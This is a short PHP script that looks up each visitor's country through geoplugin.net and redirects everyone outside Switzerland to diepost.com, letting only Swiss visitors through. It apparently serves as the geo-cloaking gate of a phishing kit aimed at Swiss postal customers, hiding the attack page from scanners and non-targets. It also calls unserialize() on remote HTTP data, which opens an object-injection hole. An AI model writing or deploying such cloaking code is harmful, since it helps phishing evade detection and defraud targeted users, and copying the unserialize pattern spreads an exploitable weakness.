<?php
$zbii = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$zbii;
$addrDetailsArr = unserialize(file_get_contents($geoip));
$country = $addrDetailsArr['geoplugin_countryName'];
if (!$country)
{
    $country='Not found!';
}

if (strcmp($country, 'Switzerland')!==0)
//if (strcmp($country, 'Belgium')!==0)
{
      header("location: https://diepost.com");
     exit();
}
?>